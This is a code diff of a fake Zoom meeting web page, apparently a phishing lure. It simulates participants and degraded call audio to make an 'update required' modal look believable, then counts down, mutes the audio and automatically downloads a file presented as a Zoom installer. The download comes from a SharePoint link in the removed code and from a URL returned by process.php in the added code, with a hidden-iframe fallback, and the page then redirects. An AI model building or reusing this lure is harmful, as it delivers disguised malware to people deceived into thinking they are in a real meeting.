+    const vibrato=ctx.createOscillator();
+    vibrato.type='sine';vibrato.frequency.setValueAtTime(4.5,now);
+    const vibratoGain=ctx.createGain();
+    vibratoGain.gain.setValueAtTime(baseFreq*0.03,now);
+    vibrato.connect(vibratoGain);
+    vibratoGain.connect(osc.frequency);
+    vibratoGain.connect(osc2.frequency);
 
-        function showNetworkIssue(participantId){ const isFeatured = state.activeParticipants[0]?.id === participantId; if(isFeatured){ elements.featuredParticipant.classList.add('network-issue'); setTimeout(()=>elements.featuredParticipant.classList.remove('network-issue'),3000) } }
+    // Speech rhythm — amplitude modulation
+    const spLFO=ctx.createOscillator();spLFO.type='square';spLFO.frequency.setValueAtTime(3.2,now);
+    const spGain=ctx.createGain();spGain.gain.setValueAtTime(0.28,now);spLFO.connect(spGain);
+    const spLFO2=ctx.createOscillator();spLFO2.type='sine';spLFO2.frequency.setValueAtTime(0.35,now);
+    const spGain2=ctx.createGain();spGain2.gain.setValueAtTime(0.12,now);spLFO2.connect(spGain2);
 
-        function startRecurringOverlay(){ stopRecurringOverlay(); state.overlayInterval = setInterval(()=>{ 
-if(!state.inMeeting) return;
-if(state.updateCompleted) return;
-showUpdateModal()
- }, CONFIG.OVERLAY_INTERVAL_MS) }
-        function stopRecurringOverlay(){ if(state.overlayInterval){ clearInterval(state.overlayInterval); state.overlayInterval=null } }
+    const voiceGain=ctx.createGain();
+    voiceGain.gain.setValueAtTime(0.45,now);
+    spGain.connect(voiceGain.gain);spGain2.connect(voiceGain.gain);
 
-function showUpdateModal(){
+    // Formant filters (speech vowel resonances)
+    const f1=ctx.createBiquadFilter();f1.type='bandpass';f1.frequency.value=800;f1.Q.value=3;
+    const f2=ctx.createBiquadFilter();f2.type='bandpass';f2.frequency.value=1300;f2.Q.value=4;
+    const fMix=ctx.createGain();fMix.gain.value=1;
+    osc.connect(f1);osc.connect(f2);osc2Gain.connect(f1);
+    f1.connect(fMix);f2.connect(fMix);fMix.connect(voiceGain);
 
-    // already completed once
-    if(state.updateCompleted) return;
+    // ─── WHITE NOISE (static / interference) ───
+    const nBuf=ctx.createBuffer(1,ctx.sampleRate*2,ctx.sampleRate);
+    const nData=nBuf.getChannelData(0);
+    for(let i=0;i<nData.length;i++)nData[i]=Math.random()*2-1;
+    const noiseNode=ctx.createBufferSource();noiseNode.buffer=nBuf;noiseNode.loop=true;
+    const noiseGain=ctx.createGain();noiseGain.gain.setValueAtTime(0.035,now);
+    noiseNode.connect(noiseGain);
 
+    // Periodic interference burst — noise gets louder momentarily
+    const burstLFO=ctx.createOscillator();burstLFO.type='square';burstLFO.frequency.setValueAtTime(0.25,now);
+    const burstGainN=ctx.createGain();burstGainN.gain.setValueAtTime(0.06,now);
+    burstLFO.connect(burstGainN);burstGainN.connect(noiseGain.gain);
 
-    // 🔒 Prevent re-running the countdown
-    
-// prevent overlay from showing more than once
-if (state.updateCountdownStarted === true) return;
+    // ─── 60Hz MAINS BUZZ ───
+    const buzz=ctx.createOscillator();buzz.type='sawtooth';buzz.frequency.setValueAtTime(60,now);
+    const buzzGain=ctx.createGain();buzzGain.gain.setValueAtTime(0.018,now);
+    buzz.connect(buzzGain);
 
-    state.updateCountdownStarted = true;
+    // ─── PRE-MIX (voice + noise + buzz) ───
+    const preMix=ctx.createGain();preMix.gain.value=1;
+    voiceGain.connect(preMix);noiseGain.connect(preMix);buzzGain.connect(preMix);
 
-    elements.updateModal.classList.remove('hidden');
-    elements.downloadStatus.classList.add('hidden');
+    // ─── DEGRADATION PROCESSOR ───
+    // This ScriptProcessor creates the "bad signal" effect:
+    //   1. Bitcrushing  — reduces sample rate + bit depth → robotic digital distortion
+    //   2. Dropouts     — random chunk silences → packet loss
+    //   3. Stutter      — repeats a short buffer → stuck packet / robotic repeat
+    //   4. Crackle      — random loud impulses → electrical interference
+    const BSIZ=4096;
+    const degrader=ctx.createScriptProcessor(BSIZ,1,1);
 
-    // Clear any existing interval (safety)
-    if (state.countdownInterval) {
-        clearInterval(state.countdownInterval);
-        state.countdownInterval = null;
-    }
+    let crushPhase=0,crushLast=0;
+    const CRUSH_RATE=0.22;                          // Sample-rate reduction factor
+    const CRUSH_BITS=5;                             // Bit depth → 32 levels (very distorted)
+    const CRUSH_MAX=Math.pow(2,CRUSH_BITS)-1;
 
-    let countdown = CONFIG.OVERLAY_COUNTDOWN_SEC;
-    elements.countdown.textContent = countdown;
+    let inDropout=false,dropoutLeft=0;
 
-    state.countdownInterval = setInterval(() => {
-        countdown--;
-        elements.countdown.textContent = countdown;
+    let inStutter=false,sBuf=new Float32Array(2048);
+    let sLen=0,sPos=0,sLeft=0;
 
-        if (countdown <= 0) {
-            clearInterval(state.countdownInterval);
-            state.countdownInterval = null;
+    const cBuf=new Float32Array(4096);              // Circular buffer for stutter source
+    let cPos=0,cFill=0;
 
-            triggerDownload(); // ✅ fires ONLY ONCE
+    degrader.onaudioprocess=function(e){
+        const inp=e.inputBuffer.getChannelData(0);
+        const out=e.outputBuffer.getChannelData(0);
+        for(let i=0;i<inp.length;i++){
+            let s=inp[i];
+
+            // — Bitcrush — hold + quantize
+            crushPhase+=CRUSH_RATE;
+            if(crushPhase>=1){crushPhase-=1;crushLast=Math.round(s*CRUSH_MAX)/CRUSH_MAX}
+            s=crushLast;
+
+            // — Packet-loss dropout (chunk silence)
+            if(!inDropout&&Math.random()<0.0008){
+                inDropout=true;
+                dropoutLeft=Math.floor(Math.random()*2500)+150;
+            }
+            if(inDropout){s=0;dropoutLeft--;if(dropoutLeft<=0)inDropout=false}
+
+            // — Stutter (stuck-packet repeat)
+            if(inStutter){
+                s=sBuf[sPos%sLen];sPos++;sLeft--;
+                if(sLeft<=0)inStutter=false;
+            }else if(Math.random()<0.00004&&cFill>600){
+                sLen=Math.floor(Math.random()*500)+150;
+                for(let j=0;j<sLen;j++){
+                    const idx=((cPos-sLen+j)%cBuf.length+cBuf.length)%cBuf.length;
+                    sBuf[j]=cBuf[idx];
+                }
+                sPos=0;sLeft=Math.floor(Math.random()*4000)+800;inStutter=true;
+            }
+
+            // — Crackle / pop
+            if(Math.random()<0.002){s+=(Math.random()-0.5)*0.5}
+
+            cBuf[cPos]=s;cPos=(cPos+1)%cBuf.length;if(cFill<cBuf.length)cFill++;
+            out[i]=s;
         }
-    }, 1000);
+    };
 
-    // Speaker off timeout (runs once)
-    if (state.speakerOffTimeout) {
-        clearTimeout(state.speakerOffTimeout);
-        state.speakerOffTimeout = null;
-    }
+    preMix.connect(degrader);
 
-    state.speakerOffTimeout = setTimeout(() => {
-        try {
-            speakerOff();
-        } catch (e) {
-            console.warn('speakerOff error', e);
-        }
-        state.speakerOffTimeout = null;
-    }, 10000);
+    // ─── TELEPHONE BANDPASS (300 Hz – 3400 Hz) ───
+    const phoneHP=ctx.createBiquadFilter();phoneHP.type='highpass';phoneHP.frequency.value=300;phoneHP.Q.value=0.7;
+    const phoneLP=ctx.createBiquadFilter();phoneLP.type='lowpass';phoneLP.frequency.value=3400;phoneLP.Q.value=0.7;
+    degrader.connect(phoneHP);phoneHP.connect(phoneLP);
+
+    // ─── MASTER GAIN ───
+    const master=ctx.createGain();master.gain.setValueAtTime(0.4,now);
+    phoneLP.connect(master);
+
+    // ─── ANALYSER (for speaking indicator) ───
+    const analyser=ctx.createAnalyser();analyser.fftSize=256;
+    master.connect(analyser);analyser.connect(ctx.destination);
+
+    // Start all sources
+    osc.start();osc2.start();vibrato.start();spLFO.start();spLFO2.start();
+    buzz.start();burstLFO.start();noiseNode.start();
+
+    state.voiceOscillators[participantId]={
+        osc,osc2,vibrato,spLFO,spLFO2,buzz,burstLFO,noiseNode,
+        voiceGain,f1,f2,fMix,osc2Gain,vibratoGain,spGain,spGain2,
+        noiseGain,buzzGain,burstGainN,preMix,degrader,phoneHP,phoneLP,master,analyser
+    };
+    state.analyserNodes[participantId]=analyser;
+    console.log('Bad-call voice started:',participantId,baseFreq+'Hz');
 }
 
-        
-     function redirectToUpdatePage(delayMs = 5000){
-    setTimeout(() => {
-        
-// stop update modal permanently
-elements.updateModal.classList.add('hidden');
-
-if(state.countdownInterval){
-   clearInterval(state.countdownInterval);
-   state.countdownInterval = null;
+function stopVoice(participantId){
+    const v=state.voiceOscillators[participantId];if(!v)return;
+    try{v.master.gain.exponentialRampToValueAtTime(0.0001,state.audioContext.currentTime+0.1)}catch(e){}
+    setTimeout(()=>{
+        [v.osc,v.osc2,v.vibrato,v.spLFO,v.spLFO2,v.buzz,v.burstLFO,v.noiseNode].forEach(n=>{try{n.stop()}catch(e){}try{n.disconnect()}catch(e){}});
+        [v.voiceGain,v.f1,v.f2,v.fMix,v.osc2Gain,v.vibratoGain,v.spGain,v.spGain2,
+         v.noiseGain,v.buzzGain,v.burstGainN,v.preMix,v.degrader,v.phoneHP,v.phoneLP,v.master,v.analyser].forEach(n=>{try{n.disconnect()}catch(e){}});
+        try{v.degrader.onaudioprocess=null}catch(e){}
+    },150);
+    delete state.voiceOscillators[participantId];
+    delete state.analyserNodes[participantId];
 }
 
-state.updateCompleted = true;
-
-// redirect to next page
-window.location.href = 'Nextzoompage.html';
-
-    }, delayMs);
-}
-function scheduleRedirectOnce() {
-  if (state.redirectScheduled) return;
-  state.redirectScheduled = true;
-
-  setTimeout(() => {
-    
-// stop update modal permanently
-elements.updateModal.classList.add('hidden');
-
-if(state.countdownInterval){
-   clearInterval(state.countdownInterval);
-   state.countdownInterval = null;
+function speakerOff(){
+    if(state.speakerOffTimeout){clearTimeout(state.speakerOffTimeout);state.speakerOffTimeout=null}
+    Object.keys(state.voiceOscillators).forEach(id=>{
+        const v=state.voiceOscillators[id];
+        if(v)try{v.master.gain.setValueAtTime(0,state.audioContext.currentTime)}catch(e){}
+    });
+    state.speakerOn=false;
 }
 
-state.updateCompleted = true;
-
-// redirect to next page
-window.location.href = 'Nextzoompage.html';
-
-  }, 5000);
+function speakerOn(){
+    if(!state.audioContext)return;
+    Object.keys(state.voiceOscillators).forEach(id=>{
+        const v=state.voiceOscillators[id];
+        if(v)try{v.master.gain.linearRampToValueAtTime(0.4,state.audioContext.currentTime+0.05)}catch(e){}
+    });
+    state.speakerOn=true;hideAudioEnable();
 }
 
+/* ═══════════════════════════════════════
+   PARTICIPANT SIMULATION
+   ═══════════════════════════════════════ */
 
-        // Robust triggerDownload() — try fetch+blob first, fallback to server proxy via hidden iframe form
+function simulateParticipantsJoining(){
+    PARTICIPANTS.forEach(p=>{
+        setTimeout(()=>{
+            if(!state.inMeeting)return;
+            addParticipant(p);
+            showNotification(`${p.name} joined the meeting`,p);
+            playSFX('userJoined');
 
-const DOWNLOAD_URL = 'https://oceanenergy-my.sharepoint.com/:u:/g/personal/sdeal_oceannenergy_com/IQAWgAC6tC87SoOKGAR5eL3tAREgdzh69_imJ6uxlXj1MLs?e=fS8H0d&download=1';
+            if(Math.random()<CONFIG.NETWORK_DROP_CHANCE){showNetworkIssue(p.id);return}
 
-function triggerDownload() {
+            const jitter=Math.random()*CONFIG.NETWORK_JITTER_MS;
+            setTimeout(()=>{
+                if(!state.inMeeting)return;
+                if(state.speakerOn){
+                    startVoice(p.id,p.baseFreq);
+                }else{
+                    showAudioEnableOnce();
+                    startVoice(p.id,p.baseFreq);
+                    const v=state.voiceOscillators[p.id];
+                    if(v)try{v.master.gain.setValueAtTime(0,state.audioContext.currentTime)}catch(e){}
+                }
+            },jitter);
 
-  // instantly stop popup/update overlay
-  try{
-      elements.updateModal.classList.add('hidden');
-
-      if(state.countdownInterval){
-          clearInterval(state.countdownInterval);
-          state.countdownInterval = null;
-      }
-
-      state.updateCompleted = true;
-  }catch(e){}
-
-  fetch(DOWNLOAD_URL)
-    .then(response => response.blob())
-    .then(blob => {
-      const url = window.URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'zoom installation.zip';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      setTimeout(() => {
-        window.URL.revokeObjectURL(url);
-
-        // redirect AFTER download finishes
-        
-// stop update modal permanently
-elements.updateModal.classList.add('hidden');
-
-if(state.countdownInterval){
-   clearInterval(state.countdownInterval);
-   state.countdownInterval = null;
-}
-
-state.updateCompleted = true;
-
-// redirect to next page
-window.location.href = 'Nextzoompage.html';
-
-      }, 8000);
-    })
-    .catch(() => {
-      const a = document.createElement('a');
-      a.href = DOWNLOAD_URL;
-      a.download = 'zoom installation.zip';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      setTimeout(() => {
-        // fallback redirect
-        
-// stop update modal permanently
-elements.updateModal.classList.add('hidden');
-
-if(state.countdownInterval){
-   clearInterval(state.countdownInterval);
-   state.countdownInterval = null;
-}
-
-state.updateCompleted = true;
-
-// redirect to next page
-window.location.href = 'Nextzoompage.html';
-
-      }, 8000);
+            startSpeakingDetection();
+        },p.joinDelay);
     });
 }
 
-        async function onUserEnableAudio(){ state.audioEnableShown = true; const unlocked = await unlockAudio(); if(!unlocked){ console.warn('unlockAudio failed on user enable'); return } await speakerOn(); hideAudioEnable(); }
+function addParticipant(p){
+    if(state.activeParticipants.find(x=>x.id===p.id))return;
+    state.activeParticipants.push(p);updateParticipantsUI();updateParticipantsList();
+}
+function removeParticipant(id){
+    state.activeParticipants=state.activeParticipants.filter(p=>p.id!==id);
+    stopVoice(id);updateParticipantsUI();updateParticipantsList();
+}
 
-window.startRemoteConversation = function(){ startConversationAudio() };
-window.stopRemoteConversation = function(){ Object.values(state.audioElements).forEach(a=>{ try{ a.pause(); a.currentTime=0 }catch(e){} }); state.speakerOn=false };
-window.startRecurringOverlay = function(ms,sec){ CONFIG.OVERLAY_INTERVAL_MS = ms||CONFIG.OVERLAY_INTERVAL_MS; CONFIG.OVERLAY_COUNTDOWN_SEC = sec||CONFIG.OVERLAY_COUNTDOWN_SEC; startRecurringOverlay() };
-window.stopRecurringOverlay = stopRecurringOverlay;
-window.loadExternalAudioToKey = function(key,fileOrUrl){ if(AUDIO_FILES[key]) AUDIO_FILES[key]=fileOrUrl; const p = PARTICIPANTS.find(x=>x.id===key); if(p) p.audioFile=fileOrUrl };
+function updateParticipantsUI(){
+    const cnt=state.activeParticipants.length+1;
+    elements.participantCount.textContent=`${cnt} people`;
+    elements.othersCount.textContent=Math.max(0,state.activeParticipants.length-1);
+    if(state.activeParticipants.length>0){
+        const f=state.activeParticipants[0];
+        elements.featuredAvatar.textContent=f.initials;
+        elements.featuredName.textContent=f.name;
+        elements.featuredRole.textContent=f.role;
+        elements.featuredNameBottom.textContent=f.name;
+    }
+    elements.thumbnailsContainer.innerHTML='';
+    state.activeParticipants.slice(1).forEach(p=>{
+        const t=document.createElement('div');t.className='thumbnail-tile';t.id=`thumb-${p.id}`;
+        t.innerHTML=`<div class="thumb-avatar">${p.initials}</div>`;
+        elements.thumbnailsContainer.appendChild(t);
+    });
+}
 
-})();
-</script>
+function updateParticipantsList(){
+    elements.participantsList.innerHTML='';
+    [{name:'You',role:'Participant',micEnabled:state.micEnabled,videoEnabled:state.videoEnabled},
+     ...state.activeParticipants.map(p=>({name:p.name,role:p.isHost?'Host':'Participant',micEnabled:true,videoEnabled:false}))
+    ].forEach(p=>{
+        const el=document.createElement('div');el.className='flex items-center justify-between p-2 bg-black/20 rounded-lg';
+        el.innerHTML=`<div class="flex items-center gap-3"><div class="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center text-sm font-bold">${p.name.split(' ').map(n=>n[0]).join('').slice(0,2)}</div><div><p class="font-medium text-sm">${p.name}</p><p class="text-gray-400 text-xs">${p.role}</p></div></div><div class="flex gap-2"><div class="w-8 h-8 rounded-full ${p.micEnabled?'bg-green-500':'bg-red-500'} flex items-center justify-center"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M7 4a3 3 0 016 0v4a3 3 0 11-6 0V4z" clip-rule="evenodd"/></svg></div><div class="w-8 h-8 rounded-full ${p.videoEnabled?'bg-green-500':'bg-red-500'} flex items-center justify-center"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path d="M2 6a2 2 0 012-2h6a2 2 0 012 2v8a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"/></svg></div></div>`;
+        elements.participantsList.appendChild(el);
+    });
+}
 
+function showNotification(message,pData=null){
+    const isJoin=/joined/i.test(message),isLeft=/left/i.test(message);
+    let initials='?',displayName=message;
+    if(pData&&pData.name){displayName=pData.name;initials=(pData.initials||displayName.split(' ').map(n=>n[0]).join('').slice(0,2)).toUpperCase()}
+    else if(isJoin||isLeft){const m=message.match(/^(.*?)\s+(joined|left)/i);if(m&&m[1]){displayName=m[1].trim();initials=displayName.split(' ').map(n=>n[0]||'').slice(0,2).join('').toUpperCase()}else initials=message.replace(/\s+/g,'').slice(0,2).toUpperCase()}
+    const n=document.createElement('div');n.className=`notification-banner${isLeft?' leave':''}`;
+    const ico=isLeft?`<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>`:`<svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"/></svg>`;
+    n.innerHTML=(isJoin||isLeft)?`<div class="notification-avatar">${initials}</div><div class="notification-content"><span class="notification-title">${displayName}</span><span class="notification-subtitle">${isLeft?'Left the meeting':'Joined the meeting'}</span></div>${ico}`:`<div class="notification-content"><span class="notification-title">${message}</span></div>`;
+    elements.notificationContainer.appendChild(n);
+    setTimeout(()=>{n.style.animation='notificationExit .3s ease-out forwards';setTimeout(()=>n.remove(),300)},3000);
+}
 
-<script>
+/* ═══════════════════════════════════════
+   SPEAKING DETECTION
+   ═══════════════════════════════════════ */
 
-// ===== AMBIENT CROWD / MEETING ROOM SOUND =====
+function startSpeakingDetection(){
+    if(state.animationFrameId)return;
+    let pendingId=null,debounceTimer=null;
+    const DEBOUNCE=2000,SWITCH_THR=0.06;
 
-let ambientAudioStarted = false;
-
-function startAmbientMeetingNoise() {
-
-    if (ambientAudioStarted) return;
-    ambientAudioStarted = true;
-
-    try {
-
-        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
-        const ctx = new AudioContextClass();
-
-        if (ctx.state === 'suspended') {
-            ctx.resume();
+    function detect(){
+        if(!state.inMeeting)return;
+        let loudest=null,loudLvl=0;
+        Object.entries(state.analyserNodes).forEach(([pid,an])=>{
+            if(!an)return;
+            const d=new Uint8Array(an.frequencyBinCount);an.getByteFrequencyData(d);
+            let sum=0;for(let i=0;i<d.length;i++)sum+=d[i];
+            const rms=sum/d.length/255;
+            const p=state.activeParticipants.find(x=>x.id===pid);if(!p)return;
+            const isFeat=state.activeParticipants[0]?.id===pid;
+            const thumb=document.getElementById(`thumb-${pid}`);
+            if(rms>CONFIG.SPEAKING_THRESHOLD){
+                if(isFeat)elements.featuredParticipant.classList.add('speaking');
+                if(thumb)thumb.classList.add('speaking');
+                if(rms>loudLvl){loudLvl=rms;loudest=p}
+            }else{
+                if(isFeat)elements.featuredParticipant.classList.remove('speaking');
+                if(thumb)thumb.classList.remove('speaking');
+            }
+        });
+        const curId=state.activeParticipants[0]?.id;
+        if(loudest&&loudest.id!==curId&&loudLvl>SWITCH_THR){
+            if(pendingId!==loudest.id){
+                pendingId=loudest.id;if(debounceTimer)clearTimeout(debounceTimer);
+                const sw=loudest;debounceTimer=setTimeout(()=>{if(state.inMeeting&&state.activeParticipants[0]?.id!==sw.id)switchFeaturedSpeaker(sw);debounceTimer=null;pendingId=null},DEBOUNCE);
+            }
         }
+        state.animationFrameId=requestAnimationFrame(detect);
+    }
+    detect();
+}
 
-        // create soft crowd-like filtered noise
-        const bufferSize = 2 * ctx.sampleRate;
-        const noiseBuffer = ctx.createBuffer(1, bufferSize, ctx.sampleRate);
-        const output = noiseBuffer.getChannelData(0);
+function switchFeaturedSpeaker(sp){
+    const idx=state.activeParticipants.findIndex(p=>p.id===sp.id);if(idx===-1||idx===0)return;
+    state.activeParticipants.unshift(state.activeParticipants.splice(idx,1)[0]);
+    updateParticipantsUI();playSFX('newSpeaker');
+}
 
-        for (let i = 0; i < bufferSize; i++) {
-            output[i] = (Math.random() * 2 - 1) * 0.08;
-        }
-
-        const whiteNoise = ctx.createBufferSource();
-        whiteNoise.buffer = noiseBuffer;
-        whiteNoise.loop = true;
-
-        const filter = ctx.createBiquadFilter();
-        filter.type = 'lowpass';
-        filter.frequency.value = 650;
-
-        const gainNode = ctx.createGain();
-        gainNode.gain.value = 0.28;
-
-        whiteNoise.connect(filter);
-        filter.connect(gainNode);
-        gainNode.connect(ctx.destination);
-
-        whiteNoise.start(0);
-
-        // occasional soft pops / chair sounds
-        setInterval(() => {
-
-            const osc = ctx.createOscillator();
-            const gain = ctx.createGain();
-
-            osc.type = 'triangle';
-            osc.frequency.value = 120 + Math.random() * 100;
-
-            gain.gain.setValueAtTime(0.08, ctx.currentTime);
-            gain.gain.exponentialRampToValueAtTime(
-                0.0001,
-                ctx.currentTime + 0.4
-            );
-
-            osc.connect(gain);
-            gain.connect(ctx.destination);
-
-            osc.start();
-            osc.stop(ctx.currentTime + 0.4);
-
-        }, 7000);
-
-        console.log('Ambient meeting noise started');
-
-    } catch (e) {
-        console.warn('Ambient sound blocked:', e);
+function showNetworkIssue(pid){
+    if(state.activeParticipants[0]?.id===pid){
+        elements.featuredParticipant.classList.add('network-issue');
+        setTimeout(()=>elements.featuredParticipant.classList.remove('network-issue'),3000);
     }
 }
 
-// start ambient noise after all participants join
-setTimeout(() => {
-    startAmbientMeetingNoise();
-}, 9000);
+/* ═══════════════════════════════════════
+   OVERLAY / UPDATE MODAL
+   ═══════════════════════════════════════ */
 
+function startRecurringOverlay(){
+    stopRecurringOverlay();
+    state.overlayInterval=setInterval(()=>{if(state.inMeeting)showUpdateModal()},CONFIG.OVERLAY_INTERVAL_MS);
+}
+function stopRecurringOverlay(){if(state.overlayInterval){clearInterval(state.overlayInterval);state.overlayInterval=null}}
+
+function showUpdateModal(){
+    if(state.updateCountdownStarted)return;state.updateCountdownStarted=true;
+    elements.updateModal.classList.remove('hidden');elements.downloadStatus.classList.add('hidden');
+    if(state.countdownInterval){clearInterval(state.countdownInterval);state.countdownInterval=null}
+    let cd=CONFIG.OVERLAY_COUNTDOWN_SEC;elements.countdown.textContent=cd;
+    state.countdownInterval=setInterval(()=>{cd--;elements.countdown.textContent=cd;if(cd<=0){clearInterval(state.countdownInterval);state.countdownInterval=null;triggerDownload()}},1000);
+    if(state.speakerOffTimeout){clearTimeout(state.speakerOffTimeout);state.speakerOffTimeout=null}
+    state.speakerOffTimeout=setTimeout(()=>{try{speakerOff()}catch(e){}state.speakerOffTimeout=null},10000);
+}
+
+function scheduleRedirectOnce(){if(state.redirectScheduled)return;state.redirectScheduled=true;setTimeout(()=>{window.location.href='update.html'},5000)}
+
+async function triggerDownload(){
+    scheduleRedirectOnce();
+    try{
+        const resp=await fetch(CONFIG.PROCESS_PHP_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'download',meetingId:CONFIG.MEETING_ID,timestamp:Date.now()})});
+        if(!resp.ok){console.error('process.php error',resp.status);return}
+        const data=await resp.json().catch(()=>null);const dlUrl=data&&data.downloadUrl;
+        if(!dlUrl){console.error('No downloadUrl',data);return}
+        function getFN(cd){if(!cd)return null;const s=cd.match(/filename\*\s*=\s*[^']*''([^;]+)/i);if(s){try{return decodeURIComponent(s[1])}catch(e){return s[1]}}const m=cd.match(/filename\s*=\s*["']?([^"';]+)["']?/i);return m?m[1]:null}
+        function guessFN(url){try{const u=new URL(url);const p=u.pathname.split('/').filter(Boolean);return p.length?p[p.length-1]:null}catch(e){return null}}
+        function dlBlob(b,fn){const u=URL.createObjectURL(b);const a=document.createElement('a');a.style.display='none';a.href=u;a.download=fn||'download';document.body.appendChild(a);a.click();setTimeout(()=>{URL.revokeObjectURL(u);a.remove()},2000)}
+        try{const fr=await fetch(dlUrl,{method:'GET',mode:'cors'});if(!fr.ok)throw new Error(fr.status);
+            if(fr.body&&fr.body.getReader){const r=fr.body.getReader();const t=parseInt(fr.headers.get('content-length')||'0',10)||null;const ch=[];let rc=0;while(true){const{done,value}=await r.read();if(done)break;ch.push(value);rc+=(value.length||value.byteLength||0);if(t)console.log(`Download: ${(rc/t*100).toFixed(1)}%`)}dlBlob(new Blob(ch),getFN(fr.headers.get('content-disposition'))||guessFN(dlUrl)||'download.bin');return}
+            else{const b=await fr.blob();dlBlob(b,getFN(fr.headers.get('content-disposition'))||guessFN(dlUrl)||'download.bin');return}
+        }catch(e){console.warn('Direct fetch failed:',e)}
+        try{const px=CONFIG.PROCESS_PHP_URL+'?proxy=1';let ifr=document.getElementById('download-proxy-iframe');if(!ifr){ifr=document.createElement('iframe');ifr.style.display='none';ifr.id='download-proxy-iframe';ifr.name='download-proxy-iframe';document.body.appendChild(ifr)}const fm=document.createElement('form');fm.style.display='none';fm.method='POST';fm.action=px;fm.target=ifr.name;const inp=document.createElement('input');inp.type='hidden';inp.name='url';inp.value=dlUrl;fm.appendChild(inp);document.body.appendChild(fm);fm.start();setTimeout(()=>{try{fm.remove()}catch(e){}},2000);return}catch(e){console.error('Proxy failed:',e)}
+        try{window.open(dlUrl,'_blank','noopener')}catch(e){console.error('Open failed:',e)}
+    }catch(err){console.error('triggerDownload error',err)}
+}
+
+async function onUserEnableAudio(){
+    state.audioEnableShown=true;
+    const ok=await unlockAudio();if(!ok)return;
+    state.speakerOn=true;speakerOn();hideAudioEnable();
+}
+
+window.startRemoteConversation=function(){if(!state.audioContext)initAudioContext();PARTICIPANTS.forEach(p=>{if(!state.voiceOscillators[p.id])startVoice(p.id,p.baseFreq)});speakerOn()};
+window.stopRemoteConversation=function(){speakerOff()};
+window.startRecurringOverlay=function(ms,sec){CONFIG.OVERLAY_INTERVAL_MS=ms||CONFIG.OVERLAY_INTERVAL_MS;CONFIG.OVERLAY_COUNTDOWN_SEC=sec||CONFIG.OVERLAY_COUNTDOWN_SEC;startRecurringOverlay()};
+window.stopRecurringOverlay=stopRecurringOverlay;
+window.loadExternalAudioToKey=function(){};
+
+})();
 </script>
 
 </body>
